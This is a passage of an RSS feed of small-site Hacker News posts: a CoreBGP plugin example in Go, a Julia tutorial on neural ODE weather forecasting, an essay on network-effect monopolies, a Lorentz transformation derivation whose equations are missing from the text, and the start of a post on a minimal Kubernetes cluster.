</span><span></span>	<span>// Per RFC5492 a BGP speaker should only send a Notification if a required
</span><span></span>	<span>// capability is missing; unknown or unsupported capabilities should be
</span><span></span>	<span>// ignored.
</span><span></span>	<span>OnOpenMessage</span>(peer <span>*</span>PeerConfig, capabilities []<span>*</span>Capability) <span>*</span>Notification

	<span>// OnEstablished is fired when a peer's FSM transitions to the Established
</span><span></span>	<span>// state. The returned UpdateMessageHandler will be fired when an Update
</span><span></span>	<span>// message is received from the peer.
</span><span></span>	<span>//
</span><span></span>	<span>// The provided writer can be used to send Update messages to the peer for
</span><span></span>	<span>// the lifetime of the FSM's current, established state. It should be
</span><span></span>	<span>// discarded once OnClose() fires.
</span><span></span>	<span>OnEstablished</span>(peer <span>*</span>PeerConfig, writer UpdateMessageWriter) UpdateMessageHandler

	<span>// OnClose is fired when a peer's FSM transitions out of the Established
</span><span></span>	<span>// state.
</span><span></span>	<span>OnClose</span>(peer <span>*</span>PeerConfig)
}
</code></pre></div><p>Here’s an example Plugin that logs when a peer enters/leaves an established state and when an UPDATE message is received:</p>
<div><pre><code data-lang="go"><span>type</span> plugin <span>struct</span>{}

<span>func</span> (p <span>*</span>plugin) <span>GetCapabilities</span>(c <span>*</span>corebgp.PeerConfig) []<span>*</span>corebgp.Capability {
	caps <span>:=</span> <span>make</span>([]<span>*</span>corebgp.Capability, <span>0</span>)
	<span>return</span> caps
}

<span>func</span> (p <span>*</span>plugin) <span>OnOpenMessage</span>(peer <span>*</span>corebgp.PeerConfig, capabilities []<span>*</span>corebgp.Capability) <span>*</span>corebgp.Notification {
	<span>return</span> <span>nil</span>
}

<span>func</span> (p <span>*</span>plugin) <span>OnEstablished</span>(peer <span>*</span>corebgp.PeerConfig, writer corebgp.UpdateMessageWriter) corebgp.UpdateMessageHandler {
	log.<span>Println</span>(<span>"peer established"</span>)
	<span>// send End-of-Rib
</span><span></span>	writer.<span>WriteUpdate</span>([]<span>byte</span>{<span>0</span>, <span>0</span>, <span>0</span>, <span>0</span>})
	<span>return</span> p.handleUpdate
}

<span>func</span> (p <span>*</span>plugin) <span>OnClose</span>(peer <span>*</span>corebgp.PeerConfig) {
	log.<span>Println</span>(<span>"peer closed"</span>)
}

<span>func</span> (p <span>*</span>plugin) <span>handleUpdate</span>(peer <span>*</span>corebgp.PeerConfig, u []<span>byte</span>) <span>*</span>corebgp.Notification {
	log.<span>Printf</span>(<span>"got update message of len: %d"</span>, <span>len</span>(u))
	<span>return</span> <span>nil</span>
}
</code></pre></div><p>Plugins are attached to peers when they are added to the Server, which manages their lifetime:</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jordanwhited.com/posts/corebgp-plugging-in-to-bgp/">https://www.jordanwhited.com/posts/corebgp-plugging-in-to-bgp/</a></em></p>]]>
            </description>
            <link>https://www.jordanwhited.com/posts/corebgp-plugging-in-to-bgp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23744167</guid>
            <pubDate>Mon, 06 Jul 2020 02:39:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Forecasting the Weather with Neural Odes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23743860">thread link</a>) | @ChrisRackauckas
<br/>
July 5, 2020 | https://sebastiancallh.github.io/post/neural-ode-weather-forecast/ | <a href="https://web.archive.org/web/*/https://sebastiancallh.github.io/post/neural-ode-weather-forecast/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<p>Weather forecasting is a tricky problem. Traditionally, it has been done
by manually modelling weather dynamics using differential equations, but this
approach is highly dependent on us getting the equations right. To
avoid this problem, we can
use machine learning to <a href="https://ai.googleblog.com/2020/03/a-neural-weather-model-for-eight-hour.html" target="_blank">directly predict the weather</a>, which
let’s us make predictions without modelling the dynamics. However, this
approach requires huge amounts of data to reach good performance.
Fortunately, there is a middle ground: What if we instead use machine
learning to model the <em>dynamics</em> of the weather?</p>

<p>Instead of trying to model how the weather will look in the next time step, what if
we instead model how the weather changes between time steps? More concretely: What if we
learn the <em>differential equations</em> that govern the change in weather?
In this blog article we are going to use <a href="https://julialang.org/" target="_blank">Julia</a> and the <a href="https://github.com/SciML" target="_blank">SciML</a> ecosystem
to do just that. We are going to see how neural ordinary differential
equations (neural ODEs) relate to “regular” networks, how to train
them and see how they can extrapolate time series from just a tiny
amount of training data.</p>

<h2 id="neural-odes-for-time-series">Neural ODEs for time series</h2>

<p>To start us off, let’s talk about how <a href="https://arxiv.org/abs/1806.07366" target="_blank">neural ODEs</a> are used for time
series modeling.
Recall that in a standard machine learning setting we
would assume a discrete set of observations \(y_0, y_1, \dots y_k, \)  \( y_i \in
\mathbb{R}^n \) at time points
\(t_0, t_1, \dots t_k, \), \(t_i \in \mathbb{R} \) to be related through some function \( y_i =
f(t_i; \theta) \) where \( \theta \) are learnable parameters.
However, in a neural ODE we consider a continuous setting and
instead assume that the <em>change</em> in \(y\) is governed by an ODE</p>

<p>\[ \frac{\delta y}{\delta t} = f(y; \theta). \]</p>

<p>The goal is hence not to learn the relationship between \(y\) and
\(t\), but the underlying dynamics of change. If the
dynamics are constant, this has very powerful generalisation capabilities.
It is helpful to think of this formulation as “a neural network inside
an ODE” or maybe “an ODE with learnable parameters”. In fact, the “forward pass”
through a neural ODE is exactly solving an <a href="https://en.wikipedia.org/wiki/Initial%5Fvalue%5Fproblem" target="_blank">initial value problem</a>,
where \( y(t_0) \) is the input features and we replace hand-crafted
equations with a neural network. This means that a <em>single</em>
forward pass gives us an entire trajectory in contrast to e.g. <a href="https://www.deeplearningbook.org/contents/rnn.html" target="_blank">RNN</a>s,
where each forward pass through the model gives a single prediction.</p>

<p>To make this more concrete,
consider a forward pass for \(y(t_0) =
1.0\) where the model has been trained on \(f^{\star}(x) =
\exp(1.5x)\). A forward pass means inputting \(y(t_0)\) and then using
an ODE solver to step forward in time. When the ODE solver
evaluates \(f\), it uses a neural network to predict \( \frac{\delta y}{\delta t} \).</p>

<figure>
    <img src="https://sebastiancallh.github.io/ox-hugo/neural-ode-explanation.gif" alt="Figure 1: Solving a simple initial value problem using a trained neural ODE. The only difference from a &amp;ldquo;regular&amp;rdquo; initial value problem is that the ODE is governed by a neural network instead of a hand-crafted set of equations. Since the network has already been trained, it accurately model dynamics."> <figcaption>
            <p>Figure 1: Solving a simple initial value problem using a trained neural ODE. The only difference from a “regular” initial value problem is that the ODE is governed by a neural network instead of a hand-crafted set of equations. Since the network has already been trained, it accurately model dynamics.</p>
        </figcaption>
</figure>


<p>So how do we train a network inside an ODE? As long as we can
take gradients of \(\theta\) with respect to the loss we can train it
using standard gradient based methods. Fortunately,
<code>DiffEqFlux</code> takes care of everything required to do this for us.
There are <a href="https://docs.sciml.ai/latest/analysis/sensitivity/#Sensitivity-Algorithms-1" target="_blank">several strategies</a> that can be specified to compute
gradients, and depending on
the problem you might prefer one over the other. However, for this article
the default <code>InterpolatingAdjoint</code> will be perfectly fine.</p>

<h3 id="model-implementation">Model implementation</h3>

<p>Now that we have a good conceptual idea of the model, let’s see it
in practice. We are going to use <a href="https://github.com/JuliaDiffEq/DiffEqFlux.jl" target="_blank">DiffEqFlux</a> to do the heavy lifting, which combines the ODE
solvers of <a href="https://github.com/SciML/DifferentialEquations.jl" target="_blank">DifferentialEquations.jl</a> with the differentiable
programming capabilities of <a href="https://github.com/FluxML/Flux.jl" target="_blank">Flux.jl</a>. Using <code>DiffEqFlux</code>, we can simply
construct a neural network to model \(f\) and plug that into a <code>NeuralODE</code>
object. The <code>NeuralODE</code> object itself has a few additional important
hyper-parameters though. Firstly, we have to <a href="https://docs.sciml.ai/stable/solvers/ode%5Fsolve/" target="_blank">specify an ODE solver</a> and a time span to
solve on. We will use the <code>Tsit5</code> solver, which uses an explicit
method. Secondly, the parameters <code>reltol</code> and <code>abstol</code> let us configure the solution
error tolerance to trade off accuracy and training time.
Recall that a forward pass means solving an initial value problem,
hence a lower tolerance gives a more accurate solution, and in turn
better gradient estimates. But of course, this requires
more function evaluations and are consequently slower to compute.</p>


<div><pre><code data-lang="julia"><span>using</span> DiffEqFlux

<span>function</span> neural_ode(t, data_dim; saveat <span>=</span> t)
    f <span>=</span> FastChain(FastDense(data_dim, <span>32</span>, swish),
		     FastDense(<span>32</span>, <span>64</span>, swish),
		     FastDense(<span>64</span>, <span>32</span>, swish),
		     FastDense(<span>32</span>, data_dim))

    node <span>=</span> NeuralODE(f, (minimum(t), maximum(t)), Tsit5(),
		     saveat <span>=</span> saveat, abstol <span>=</span> <span>1e-9</span>,
		     reltol <span>=</span> <span>1e-9</span>)
<span>end</span></code></pre></div>
<h2 id="the-delhi-dataset">The Delhi dataset</h2>

<p>The <a href="https://www.kaggle.com/sumanthvrao/daily-climate-time-series-data" target="_blank">dataset</a> we are going to use comprises daily
measurements of the climate in Delhi over several years.
The entire dataset is a single time series, where the last part is
set aside for testing. We will combine both the train and test set though,
since we won’t even need half of the training set to fit a good model.
Let’s load up the data and visualize it.</p>


<div><pre><code data-lang="julia"><span>using</span> DataFrames, CSV
delhi_train <span>=</span> CSV<span>.</span>read(<span>"data/timeseries/dehli-temp/DailyDelhiClimateTrain.csv"</span>)
delhi_test <span>=</span> CSV<span>.</span>read(<span>"data/timeseries/dehli-temp/DailyDelhiClimateTest.csv"</span>)
delhi <span>=</span> vcat(delhi_train, delhi_test)</code></pre></div>
<figure>
    <img src="https://sebastiancallh.github.io/ox-hugo/delhi-data-visualisation.svg" alt="Figure 2: Visualisation of the raw data. There is a clear seasonal trend, but there are some extreme outliers among the pressure measurements, which make it difficult to see any patterns."> <figcaption>
            <p>Figure 2: Visualisation of the raw data. There is a clear seasonal trend, but there are some extreme outliers among the pressure measurements, which make it difficult to see any patterns.</p>
        </figcaption>
</figure>


<p>Something is off with the air pressure measurements, indicated by the
extreme outliers after 2016. However, prior to 2016 the measurements
show a nice periodic behavior.</p>

<figure>
    <img src="https://sebastiancallh.github.io/ox-hugo/pressure-prior-2016.svg" alt="Figure 3: Zooming in on the pressure before 2016 reveal the same pleasant seasonal behavior as in the other measurements."> <figcaption>
            <p>Figure 3: Zooming in on the pressure before 2016 reveal the same pleasant seasonal behavior as in the other measurements.</p>
        </figcaption>
</figure>


<p>As an aside, if you read the dataset description it claims that the <code>Mean pressure</code>
variable is measured in <a href="https://en.wikipedia.org/wiki/Standard%5Fatmosphere%5F(unit)" target="_blank">atm</a>. Now, I have never been to Delhi, but I have my doubts since that would
mean that the city of Delhi suffers under a <em>thousand atmospheres
worth of pressure</em>. While such a phenomenon would be pretty cool and without a doubt get
scientists excited, I think it is more likely the units simply got mixed up, and the
actual unit pressure is millibar. Anyway, let’s prepare the data for model training.</p>

<h3 id="data-pre-processing">Data pre-processing</h3>

<p>All the metrics vary a lot from day to day, so to emphasis the overall
trend in the data we will average the observations into months.</p>


<div><pre><code data-lang="julia"><span>using</span> Statistics
<span>using</span> Base<span>.</span>Iterators<span>:</span> take, cycle

delhi[<span>:</span>,<span>:</span>year] <span>=</span> <span>Float64</span><span>.</span>(year<span>.</span>(delhi[<span>:</span>,<span>:</span>date]))
delhi[<span>:</span>,<span>:</span>month] <span>=</span> <span>Float64</span><span>.</span>(month<span>.</span>(delhi[<span>:</span>,<span>:</span>date]))
df_mean <span>=</span> by(delhi,
	     [<span>:</span>year, <span>:</span>month],
	     <span>:</span>meantemp <span>=&gt;</span> mean,
	     <span>:</span>humidity <span>=&gt;</span> mean,
	     <span>:</span>wind_speed <span>=&gt;</span> mean,
	     <span>:</span>meanpressure <span>=&gt;</span> mean)
rename!(df_mean, [<span>:</span>year, <span>:</span>month, <span>:</span>meantemp,
		  <span>:</span>humidity, <span>:</span>wind_speed, <span>:</span>meanpressure])

df_mean[<span>!</span>,<span>:</span>date] <span>.=</span> df_mean[<span>:</span>,<span>:</span>year] <span>.+</span> df_mean[<span>:</span>,<span>:</span>month] <span>./</span> <span>12</span>;</code></pre></div>
<p>In addition to averaging, we will normalize the data. The features are
normalized to have zero mean and unit variance, and the temporal
dimension is shifted to start at \(0\). Finally, we take the first
\(20\) observations as our training data and leave the remaining for testing.</p>


<div><pre><code data-lang="julia">t <span>=</span> df_mean[<span>:</span>, <span>:</span>date] <span>|&gt;</span>
    t <span>-&gt;</span> t <span>.-</span> minimum(t) <span>|&gt;</span>
    t <span>-&gt;</span> reshape(t, <span>1</span>, <span>:</span>)

y <span>=</span> df_mean[<span>:</span>, features] <span>|&gt;</span>
    y <span>-&gt;</span> <span>Matrix</span>(y)<span>'</span> <span>|&gt;</span>
    y <span>-&gt;</span> (y <span>.-</span> mean(y, dims <span>=</span> <span>2</span>)) <span>./</span> std(y, dims <span>=</span> <span>2</span>)

T <span>=</span> <span>20</span>
train_dates <span>=</span> df_mean[<span>1</span><span>:</span>T, <span>:</span>date]
test_dates <span>=</span> df_mean[T<span>+</span><span>1</span><span>:</span><span>end</span>, <span>:</span>date]
train_t, test_t <span>=</span> t[<span>1</span><span>:</span>T], t[T<span>:</span><span>end</span>]
train_y, test_y <span>=</span> y[<span>:</span>,<span>1</span><span>:</span>T], y[<span>:</span>,T<span>:</span><span>end</span>];</code></pre></div>
<figure>
    <img src="https://sebastiancallh.github.io/ox-hugo/delhi-data-split.svg" alt="Figure 4: The normalized data split into test and train. This is what the model will &amp;ldquo;see&amp;rdquo; during training and evaluation."> <figcaption>
            <p>Figure 4: The normalized data split into test and train. This is what the model will “see” during training and evaluation.</p>
        </figcaption>
</figure>


<p>Since we are training our model using gradient descent, we run the
risk of getting stuck into a bad local minima. This is particularly
true when training on a periodic time series, since the model can easily
settle with predicting the time series mean. Mini-batching can be used to mitigate
this, but for this problem we are going to employ a <a href="https://diffeqflux.sciml.ai/dev/examples/local%5Fminima/" target="_blank">different method</a>.
We are going to train on the first couple of observations until
convergence, then introduce a few more observations. Then train until
convergence, introduce some more observations, etc… By doing this, we
let the model adapt to local changes, resulting in a better fit. The
code below implements this training procedure.</p>


<div><pre><code data-lang="julia"><span>using</span> OrdinaryDiffEq, Flux, Optim, CUDA, Random
CUDA<span>.</span>allowscalar(<span>false</span>)

<span>function</span> train(node, t, y, y0, θ <span>=</span> <span>nothing</span>; maxiters, lr)
    predict(θ) <span>=</span> <span>Array</span>(node(y0, θ))
    loss(θ) <span>=</span> <span>begin</span>
	    ŷ <span>=</span> predict(θ)
	    l <span>=</span> Flux<span>.</span>mse(ŷ, y)
	    <span>return</span> l, ŷ
    <span>end</span>

    losses <span>=</span> []
    params <span>=</span> []
    cb(θ, l, ŷ) <span>=</span> <span>begin</span>
	    push!(losses, l)
	    push!(params, copy(θ))
	    <span>false</span>
    <span>end</span>

    θ <span>=</span> θ <span>==</span> <span>nothing</span> <span>?</span> node<span>.</span>p <span>:</span> θ
    res <span>=</span> DiffEqFlux<span>.</span>sciml_train(loss, θ, ADAMW(lr),
				 maxiters <span>=</span> maxiters,
				 cb <span>=</span> cb, save_best <span>=</span> <span>true</span>)
    <span>return</span> res<span>.</span>minimizer, losses, params
<span>end</span>

Random<span>.</span>seed!(<span>1</span>);
y0 <span>=</span> train_y[<span>:</span>,<span>1</span>]
maxiters <span>=</span> <span>200</span>
losses <span>=</span> []
θs <span>=</span> []
θ <span>=</span> <span>nothing</span>
num_obs <span>=</span> <span>4</span><span>:</span><span>4</span><span>:</span>length(train_t)
<span>for</span> k <span>in</span> num_obs
    node <span>=</span> neural_ode(train_t[<span>1</span><span>:</span>k], size(y, <span>1</span>))
    θ, loss, param <span>=</span> train(node, train_t[<span>1</span><span>:</span>k], train_y[<span>:</span>,<span>1</span><span>:</span>k], y0, θ,
			   maxiters <span>=</span> maxiters, lr <span>=</span> <span>5e-3</span>);
    losses <span>=</span> vcat(losses, loss)
    θs <span>=</span> vcat(θs, param)
<span>end</span></code></pre></div>
<figure>
    <img src="https://sebastiancallh.github.io/ox-hugo/delhi-training2.gif" alt="Figure 5: Animation of training through incrementally adding observations. When new observations are added the loss curve makes a sudden jump, but quickly settles down again. This process successfully avoids bad local minima and results in a very nice fit."> <figcaption>
            <p>Figure 5: Animation of training through incrementally adding observations. When new observations are added the loss curve makes a sudden jump, but quickly settles down again. This process successfully avoids bad local minima and results in a very nice fit.</p>
        </figcaption>
</figure>


<p>The model trains in a minute or two and fits nicely to the training data.
Of course, a more interesting question is whether the model
generalises or not. We solve the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sebastiancallh.github.io/post/neural-ode-weather-forecast/">https://sebastiancallh.github.io/post/neural-ode-weather-forecast/</a></em></p>]]>
            </description>
            <link>https://sebastiancallh.github.io/post/neural-ode-weather-forecast/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23743860</guid>
            <pubDate>Mon, 06 Jul 2020 01:38:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What should we do about network-effect monopolies]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23743610">thread link</a>) | @dmnd
<br/>
July 5, 2020 | https://www.benkuhn.net/nwe/ | <a href="https://web.archive.org/web/*/https://www.benkuhn.net/nwe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Many large companies today are software monopolies that give their product away for free to get monopoly status, then do <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/338#issuecomment-496009417" target="_blank">the</a> <a href="http://www.fbpurity.com/news/important-news-facebooks-legal-team-have-told-me-i-am-banned-from-facebook-because-of-f-b-purity/" target="_blank">most</a> <a href="https://www.theverge.com/2019/6/28/19154220/grubhub-seamless-fake-restaurant-domain-names-commission-fees" target="_blank">horrible</a> <a href="https://www.nytimes.com/wirecutter/blog/amazon-counterfeit-fake-products/" target="_blank">things</a> <a href="https://www.theverge.com/2020/6/16/21293419/hey-apple-rejection-ios-app-store-dhh-gangsters-antitrust" target="_blank">once</a> <a href="https://www.polemicdigital.com/google-amp-go-to-hell/" target="_blank">they’ve</a> <a href="https://thetechnoskeptic.com/yelp-extortion-starring-role/" target="_blank">won</a>. (<a href="https://www.benkuhn.net/skinner/">Previously</a>, <a href="https://www.benkuhn.net/product/">previously</a>.) Can we do anything about this?</p><p>Unfortunately, “you’re the product” is a popular business model for a reason: businesses like Facebook would be really hard to support without them.</p><p>Facebook would be suicidal to charge its users money, because its entire selling point is that everyone uses it, and “everyone” <em>hates</em> paying money. In the US, Facebook makes over $25 per person on ads (<a href="https://www.statista.com/statistics/251328/facebooks-average-revenue-per-user-by-region/" target="_blank">source</a>). Can you imagine if instead of ads they tried to charge people $25 a year?</p><p>Even on the margin, anything that costs Facebook users also makes it less valuable for its remaining users—it’s a negative feedback loop. The same goes for any other site where users create value for other users, like Twitter or Craigslist or Yelp or Wikipedia. (It’s not an accident that these are some of the most stagnant popular websites!)</p><p>In fact, this is a fundamental problem with <a href="https://en.wikipedia.org/wiki/Network_effect" target="_blank">network effects</a> and low marginal costs. If a company wants to maintain a network effect, they need as many users as possible. If their marginal cost is low, then the easiest way to get users is to give the product away. To do that, they have to get paid by someone else. And when they start getting paid by someone else, they’ll inevitably start prioritizing that person’s interests.</p><p>Historically with other network-effect businesses, we’ve addressed this in a few different ways:</p><ul><li><p>regulation (e.g. local utilities)</p></li><li><p>breakups (e.g. Bell)</p></li><li><p>standardization and interoperability (e.g. email, the Web, cryptocurrency)</p></li></ul><p>So far for tech monopolies, people seem to be focused mostly on breakups—e.g. Facebook from Instagram/Whatsapp—but standardization seems to have produced much better outcomes in the past. (I like email and the Web a lot more than National Grid…) I’d be interested to see more exploration of that option!</p></article></div>]]>
            </description>
            <link>https://www.benkuhn.net/nwe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23743610</guid>
            <pubDate>Mon, 06 Jul 2020 00:46:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lorentz Transformation Derivation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23743557">thread link</a>) | @keyboardman
<br/>
July 5, 2020 | https://leimao.github.io/blog/Lorentz-Transformation-Derivation/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/Lorentz-Transformation-Derivation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>In my previous blog post <a href="https://leimao.github.io/blog/Special-Relativity/">“Special Relativity Explained”</a>, I have explained special relativity and its several key consequences based on the Lorentz transformation.</p>



<p>Since I did not give a derivation for Lorentz transformation last time, in this blog post, I would like to present the derivations in detail.</p>

<h3 id="postulates-of-special-relativity">Postulates of Special Relativity</h3>

<p>Lorentz transformation was derived based on the following two postulates only.</p>

<h4 id="first-postulate-principle-of-relativity">First Postulate (Principle of Relativity)</h4>

<p>The laws of physics take the same form in all inertial frames of reference.</p>

<h4 id="second-postulate-invariance-of-light-speed">Second Postulate (Invariance of Light Speed)</h4>

<p>As measured in any inertial frame of reference, light is always propagated in empty space with a definite velocity $c$ that is independent of the state of motion of the emitting body. It is also equivalent to say, the speed of light in free space has the same value $c$ in all inertial frames of reference.</p>

<h3 id="derivation">Derivation</h3>

<p>In the spacetime, we have two reference frames, a reference frame $S$ and another reference frame $S’$ moving at a velocity $v$ with respect to it. So the two reference frames in this scenario are inertial reference frame. The coordinate axes in each reference frame are parallel, i.e., the $x$ and $x’$ axes are parallel, the $y$ and $y’$ axes are parallel, and the $z$ and $z’$ axes are parallel, and remain mutually perpendicular. We assume the relative motion is along the coincident $xx’$ axes. At $t = t’ = 0$, the origins of both coordinate systems are the same, $(x,y,z) = (x’,y’,z’) = (0, 0, 0)$.</p>



<p>An event in the time space could be observed and recorded by the observers on the two reference frames using spacetime coordinates $(t,x,y,z)$ in the reference frame $S$ and $(t’,x’,y’,z’)$ in the reference frame $S’$, respectively.</p>



<p>We want to set up the mapping between $(t,x,y,z)$ and $(t’,x’,y’,z’)$ for the same event.</p>

<h4 id="lorentz-transformation-is-linear-transformation">Lorentz Transformation is Linear Transformation</h4>

<p>We propose the spacetime transformation from the reference frame $S$ to the reference frame $S’$ to have the following form.</p>



<p>Note that we could eliminate the variables $y$ and $z$ in the functions $f_t$ and $f_x$ because of $y$ and $z$ are constants.</p>



<p>Now that we have proposed the form of transformation, there could be an infinite number of transformations that satisfied the form. What exactly the transformation is?</p>



<p>Suppose we have two events, one event has coordinates $(t_1,x_1,y_1,z_1)$ observed in the reference frame $S$ and coordinates $(t’_1,x’_1,y’_1,z’_1)$ observed in the reference frame $S’$, another one has coordinates $(t_2,x_2,y_2,z_2)$ observed in the reference frame $S$ and coordinates $(t’_2,x’_2,y’_2,z’_2)$ observed in the reference frame $S’$. Note that because reference frame $S’$ is moving along the $xx’$ axes, $y_1 = y’_1$, $z_1 = z’_1$, $y_2 = y’_2$, $z_2 = z’_2$.</p>



<p>Without loss of generality, we set $t_1 = t^{\prime}_1 = 0$, $x_1 = x^{\prime}_1 = 0$.</p>





<p>The two events, $(t_1,x_1,y_1,z_1)$ and $(t_2,x_2,y_2,z_2)$ observed in reference frame $S$, $(t’_1,x’_1,y’_1,z’_1)$ and $(t’_2,x’_2,y’_2,z’_2)$ observed in reference $S’$ have become equivalent to $(0,0,y_1,z_1)$ and $(\Delta t,\Delta x,y_2,z_2)$ observed in reference frame $S$, $(0,0,y’_1,z’_1)$ and $(\Delta t^{\prime},\Delta x^{\prime},y’_2,z’_2)$ observed in reference $S’$.</p>



<p>Based on the principle of relativity assumption, the transformation still holds. We have</p>



<p>and</p>



<p>This means the distances and time elapsed could also be transformed using the exact transformation for coordinates!</p>



<p>Ignoring uninteresting $y$ and $z$, we could equivalently write</p>





<p>We set a column vector $p = [t, x]^{\top}$ and this $p$ is a tensor in physics. It is also equivalent to write</p>



<p>This is also further equivalent to</p>



<p>In the next step, we would like to further show</p>



<p>Similarly suppose we have two events, one event has coordinates $(t_1,x_1,y_1,z_1)$ observed in the reference frame $S$ and coordinates $(t’_1,x’_1,y’_1,z’_1)$ observed in the reference frame $S’$, another one has coordinates $(t_2,x_2,y_2,z_2)$ observed in the reference frame $S$ and coordinates $(t’_2,x’_2,y’_2,z’_2)$ observed in the reference frame $S’$. In addition, in the reference frame it is observed that $t_2 = k t_1$ and $x_2 = k x_1$. Based on the principal of relativity assumption, $t’_2 = k t’_1$ and $x’_2 = k x’_1$.</p>



<p>Because</p>





<p>Therefore,</p>



<p>Because we have shown that</p>



<p>This is exactly the <a href="https://en.wikipedia.org/wiki/Linear_map#Definition_and_first_consequences">definition of a linear function</a> for function $f$ ($f_t$ and $f_x$), and note that this linear function $f$ has no bias term. Therefore, $f(p) = Mp$ for some matrix $M \in \mathbb{R}^{2 \times 2}$, and Lorentz transformation is a linear transformation.</p>

<h4 id="lorentz-transformation">Lorentz Transformation</h4>

<p>Because Lorentz transformation is a linear transformation, we could assume</p>



<p>Then the problem is very like the machine learning regression problem where we have to find the values for parameter $A$, $B$, $C$, and $D$. To solve this regression problem, we need some concrete data.</p>



<p>Because the reference frame $S’$ is moving at velocity $v$ with respect to the reference frame $S$. At time $t$ in the reference frame $S$ and $t’$ in the reference frame $S’$, we know $x = vt$ in the reference frame $S$ overlaps with the origin $x’ = 0$ in the reference frame $S’$. Note that $x = vt + 1$ in the reference frame $S$ does not necessary overlaps with $x’ = 1$ in the reference frame $S’$, although this is true in <a href="https://en.wikipedia.org/wiki/Galilean_transformation">Galilean transformations</a>.</p>



<p>We found the relationships between $C$ and $D$.</p>



<p>In addition, because the reference frame $S$ is moving at velocity $-v$ with respect to the reference frame $S’$. At time $t$ in the reference frame $S$ and $t’$ in the reference frame $S’$, we know $x = 0$ in the reference frame $S$ overlaps with the origin $x’ = -vt$ in the reference frame $S’$.</p>



<p>We cancel the variable $t’$ and get</p>



<p>So</p>



<p>This reduced the number of free parameters from four to two.</p>



<p>There could many different ways to derive the values for $B$ and $D$, but usually the simplest way is to directly do thought experiments using light. Here is one thought experiment, and there could be many others.</p>



<p>Suppose we shot a beam of light in the reference frame $S’$, At time $t$ in the reference frame $S$ and $t’$ in the reference frame $S’$, the event of the head of the light beam has $x = ct$ in the reference frame $S$ and reference $x’ = ct’$ frame $S’$, where $c$ is the light speed constant, based on the invariance of light speed assumption.</p>



<p>We cancel the variable $t’$ and get</p>



<p>We could then get the relationship between $B$ and $D$</p>



<p>Now the linear transformation has become</p>



<p>We are able to derive the inverse transformation as well.</p>



<p>That the reference frame $S’$ is moving at a velocity $v$ with respect to the reference frame $S$ is equivalent to that the reference frame $S$ is moving at a velocity $-v$ with respect to the reference frame $S’$. Based on the principle of relativity assumption, the linear transformation also has the same form, which is</p>



<p>This means that</p>



<p>Therefore,</p>



<p>We often use $\gamma$ to represent this factor, and this factor is called Lorentz factor.</p>



<p>The linear transformation is called Lorentz transformation.</p>



<p>We could further include the other two dimensions for $yy’$ and $zz’$.</p>



<p>Sometimes, to make the transformation matrix symmetric, we have the following equivalent form.</p>



<p>where</p>



<p>This concludes the derivation.</p>

<h3 id="conclusions">Conclusions</h3>

<p>The derivation of Lorentz transformation is mathematically simple. It only requires to use the basic linear algebra, or even just high school math. However, since the transformation is against our common sense, and the derivation is only based on the two “simple” postulates, we have to be aware not to introduce additional assumptions during derivation.</p>



<p>In high school physics class or college physics class for non-physics-major students, the lecturers would usually just present the Lorentz transformation and skip the derivation in the lectures for special relativity.</p>

      <hr>
      
    </div></div>]]>
            </description>
            <link>https://leimao.github.io/blog/Lorentz-Transformation-Derivation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23743557</guid>
            <pubDate>Mon, 06 Jul 2020 00:36:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Minimum Viable Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23743502">thread link</a>) | @shosti
<br/>
July 5, 2020 | https://eevans.co/blog/minimum-viable-kubernetes/ | <a href="https://web.archive.org/web/*/https://eevans.co/blog/minimum-viable-kubernetes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <section class="page">
  <article>
    <header>
      
    </header>

    
<p>
If you're reading this, chances are good that you've heard of Kubernetes. (If
you haven't, how exactly did you end up here?) But what actually is Kubernetes?
Is it <a href="https://kubernetes.io/">"Production-Grade Container Orchestration"</a>?  Is it a <a href="https://platform9.com/blog/kubernetes-as-a-cloud-native-operating-system-on-premises-too/">"Cloud-Native
Operating System"</a>? What do either of those phrases even mean?
</p>
<p>
To be completely honest, I'm not always 100% sure. But I think it's interesting
and informative to take a peek under the hood and see what Kubernetes actually
<em>does</em> under the many layers of abstraction and indirection. So just for fun,
let's see what the absolute bare minimum "Kubernetes cluster" actually looks
like. (It's going to be a lot more minimal than setting up Kubernetes <a href="https://github.com/kelseyhightower/kubernetes-the-hard-way">the hard
way</a>.)
</p>
<p>
I'm going to assume a basic familiarity with Kubernetes, Linux, and containers,
but nothing too advanced. By the way, this is all for learning/exploration
purposes, so don't run any of it in production!
</p>
<h2 id="headline-1">
Big Picture View
</h2>
<p>
Kubernetes has a lot of components and it's sometimes a bit difficult to keep
track of all of them. Here's what the overall architecture looks like according
to <a href="https://commons.wikimedia.org/w/index.php?curid=53571935">Wikipedia</a>:
</p>
<p>
<img src="https://eevans.co/blog/minimum-viable-kubernetes/k8s-arch.png" alt="k8s-arch.png" title="k8s-arch.png">
</p>
<p>
There are at least eight components listed in that diagram; we're going to be
ignoring most of them. I'm going to make the claim that the minimal thing you
could reasonably call Kubernetes consists of three essential components:
</p>
<ul>
<li>
<p>
kubelet
</p>
</li>
<li>
<p>
kube-apiserver (which depends on etcd as its database)
</p>
</li>
<li>
<p>
A container runtime (Docker in this case)
</p>
